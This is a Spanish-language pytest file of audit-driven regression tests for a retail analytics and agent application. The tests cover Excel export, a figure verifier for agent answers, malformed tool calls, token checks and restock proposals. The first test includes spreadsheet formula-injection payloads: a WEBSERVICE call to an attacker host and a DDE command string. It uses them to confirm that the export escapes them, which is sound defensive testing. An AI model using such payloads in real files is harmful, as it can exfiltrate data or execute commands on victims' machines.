"""Casos de falla señalados por las auditorías (code review y seguridad)."""
import io
import json
import socket
import uuid
from datetime import datetime, timedelta, timezone

import pytest
from openpyxl import load_workbook
from pydantic import ValidationError

from fuente.aplicacion.agentes import EjecutarMision, GestionarPropuestas, cifras_no_respaldadas
from fuente.aplicacion.herramientas import GobiernoHerramientas, HerramientaRechazada
from fuente.aplicacion.interfaces import RechazoDeServicio, ServicioNoDisponible
from fuente.dominio.reportes import EspecificacionReporte
from fuente.infraestructura.excel import reporte_xlsx
from fuente.infraestructura.herramientas_mcp import HerramientasMcp
from fuente.infraestructura.identidad import TokenInvalido, VerificadorTokens
from pruebas.test_aplicacion import HerramientasFalsas, LlmInyectado, RepositorioMemoria
from pruebas.test_ingesta_analitica import pedido, variante

pytestmark = pytest.mark.anyio
AHORA = datetime.now(timezone.utc)


def test_excel_no_ejecuta_formulas_y_el_titulo_no_puede_empezar_como_formula():
    with pytest.raises(ValidationError):
        EspecificacionReporte(titulo='=HYPERLINK("http://x","clic")', metrica="MONTO")
    reporte = {"especificacion": {"titulo": "Ventas", "metrica": "UNIDADES", "agrupar_por": "PRODUCTO", "periodo": "TODO",
                                  "visualizacion": "BARRAS", "destino": "PANEL", "limite": 10},
               "datos": {"filas": [{"clave": '=WEBSERVICE("http://atacante/"&B8)', "valor": 3}], "total": 3},
               "generativa": False, "peticion": "+cmd|' /C calc'!A0", "salida_modelo": None, "observacion": None, "datos_al": None}
    libro = load_workbook(io.BytesIO(reporte_xlsx(reporte)))
    celdas = [c for hoja in libro for fila in hoja.iter_rows() for c in fila if isinstance(c.value, str)]
    assert all(c.data_type == "s" for c in celdas)
    assert any(c.value.startswith("'=WEBSERVICE") for c in celdas) and any(c.value.startswith("'+cmd") for c in celdas)


def test_verificador_de_cifras_estricto():
    datos = [{"pedidos": 14, "monto": "1320.00", "datos_al": "2026-10-22T14:25:03Z", "sku": "CLB-25", "variantes": []}]
    assert cifras_no_respaldadas("Hubo 14 pedidos por 1.320 Bs y 0 variantes en riesgo.", datos) == []
    assert cifras_no_respaldadas("Se vendieron 1.320,00 Bs (1,320.00 Bs).", datos) == []
    # 25 está en la hora y 25.000 es miles: ninguno respalda «25.000 Bs».
    assert cifras_no_respaldadas("Hoy hubo 25.000 Bs en 14 pedidos.", datos) == ["25.000"]
    # Una cifra grande de la misión no se vuelve «dato»; un número pequeño sí (p. ej., «top 5»).
    assert cifras_no_respaldadas("Las ventas fueron 99999.", datos, "dime si fueron 99999") == ["99999"]
    assert cifras_no_respaldadas("Este es tu top 5.", datos, "dame el top 5") == []
    assert cifras_no_respaldadas("La polera 22F725 se vende bien.", datos) == []


async def test_argumentos_malformados_del_modelo_no_tumban_la_mision():
    class LlmTorpe(LlmInyectado):
        async def conversar(self, mensajes, herramientas):
            self.rondas += 1
            if self.rondas == 1:
                return {"role": "assistant", "content": "", "tool_calls": [
                    {"function": {"name": "obtener_stock_bajo", "arguments": "[1, 2"}},
                    {"function": {"name": "obtener_stock_bajo", "arguments": [1, 2]}}]}
            return {"role": "assistant", "content": "Sin novedades [obtener_stock_bajo]."}

    repo = RepositorioMemoria()
    resultado = await EjecutarMision(LlmTorpe(), HerramientasFalsas(), repo).ejecutar("Revisa el inventario", "a", "t")
    assert resultado["agentes"][0]["respuesta"] == "Sin novedades [obtener_stock_bajo]."
    assert [r for r in repo.auditoria if r[1] == "obtener_stock_bajo" and not r[2]] == [("inventario", "obtener_stock_bajo", False)] * 2


async def test_cliente_mcp_traduce_un_servidor_caido_a_servicio_no_disponible():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        puerto = s.getsockname()[1]
    with pytest.raises(ServicioNoDisponible):
        async with HerramientasMcp(f"http://127.0.0.1:{puerto}/mcp/").sesion("monitoreo", "token") as sesion:
            await sesion.listar()


def test_un_bearer_que_no_es_jwt_es_token_invalido_sin_red():
    with pytest.raises(TokenInvalido):
        VerificadorTokens("http://127.0.0.1:9/jwks", "emisor")._verificar("abc")


async def test_orden_por_metrica_y_dias_recientes(repositorio):
    eventos = [pedido("ana", [("A-M", "Poleras", "M", 5, 10)], dias=1), pedido("beto", [("B-L", "Abrigos", "L", 1, 900)], dias=2)]
    eventos += [pedido("caro", [("A-S", "Poleras", "S", 1, 10)], dias=d) for d in range(3, 15)]
    await repositorio.aplicar_eventos_ventas([{"identificador": i, "tipo": "pedido_confirmado", "identificador_pedido": e["identificador"],
                                               "datos": e} for i, e in enumerate(eventos)], len(eventos))
    monto = await repositorio.resumen_ventas(None, "PRODUCTO", 1, "MONTO")
    unidades = await repositorio.resumen_ventas(None, "PRODUCTO", 1, "UNIDADES")
    assert monto["grupos"][0]["clave"] == "Prenda B-L" and unidades["grupos"][0]["clave"] == "Prenda A-S"
    dias = [g["clave"] for g in (await repositorio.resumen_ventas(None, "DIA", 3))["grupos"]]
    assert dias == sorted(dias) and dias[-1] == (AHORA - timedelta(days=1)).astimezone(timezone(timedelta(hours=-4))).strftime("%Y-%m-%d")


async def test_un_evento_malformado_no_bloquea_la_fuente(repositorio):
    bueno = pedido("ana", [("A-M", "Poleras", "M", 1, 10)])
    roto = {"identificador": 1, "tipo": "pedido_confirmado", "identificador_pedido": "x", "datos": {"fecha_actualización": "ayer"}}
    aplicados = await repositorio.aplicar_eventos_ventas(
        [roto, {"identificador": 2, "tipo": "pedido_confirmado", "identificador_pedido": bueno["identificador"], "datos": bueno}], 2)
    assert aplicados == 1 and await repositorio.posicion("ventas") == 2
    async with repositorio.pool.connection() as c:
        assert (await (await c.execute("select count(*) n from eventos_rechazados")).fetchone())["n"] == 1


class InventarioFalso:
    def __init__(self):
        self.version_actual, self.envios, self.falla = 3, [], None

    async def version(self, variante):
        return self.version_actual

    async def registrar_entrada(self, variante, cuerpo, clave, token):
        self.envios.append((clave, json.dumps(cuerpo, sort_keys=True)))
        if self.falla:
            falla, self.falla = self.falla, None
            raise falla
        return {"movimiento": {"cantidad": cuerpo["cantidad"]}}


async def test_propuestas_un_solo_abierto_reintento_idempotente_y_revision(repositorio):
    v = variante("A-M", 2, 5)
    await repositorio.reemplazar_existencias([v])
    gobierno, inventario = GobiernoHerramientas(repositorio), InventarioFalso()
    propuesta = await gobierno.proponer_reposicion(v["identificador"], 10, "Stock bajo", "admin-1")
    with pytest.raises(HerramientaRechazada, match="abierta"):
        await gobierno.proponer_reposicion(v["identificador"], 500, "Aprobado por gerencia", "admin-1")

    gestor = GestionarPropuestas(repositorio, inventario)
    inventario.falla = ServicioNoDisponible("corte")       # el primer envío se pierde
    with pytest.raises(ServicioNoDisponible):
        await gestor.confirmar(propuesta["identificador"], "admin-1", "t")
    inventario.version_actual = 4                            # otro movimiento cambió la versión entre intentos
    confirmada = await gestor.confirmar(propuesta["identificador"], "admin-1", "t")
    assert confirmada["estado"] == "CONFIRMADA"
    assert len({e for e in inventario.envios}) == 1          # misma clave y mismo cuerpo en ambos intentos
    entrada = json.loads(inventario.envios[0][1])
    assert entrada["tipo"] == "ENTRADA" and entrada["cantidad"] == 10
    assert "Recepción de mercadería" in entrada["motivo"] and "ingreso físico confirmado" in entrada["motivo"]
    with pytest.raises(PermissionError):
        await gestor.rechazar(propuesta["identificador"], "admin-2")

    otra = await gobierno.proponer_reposicion(v["identificador"], 5, "Otra vez bajo", "admin-1")
    inventario.falla = RechazoDeServicio(409, {"mensaje": "Conflicto de versión"})
    with pytest.raises(RechazoDeServicio):
        await gestor.confirmar(otra["identificador"], "admin-1", "t")
    assert (await repositorio.propuesta(otra["identificador"]))["estado"] == "REQUIERE_REVISION"
    assert (await gestor.rechazar(otra["identificador"], "admin-1"))["estado"] == "RECHAZADA"
    with pytest.raises(HerramientaRechazada):
        await gobierno.proponer_reposicion(str(uuid.uuid4()), 5, "No existe", "admin-1")
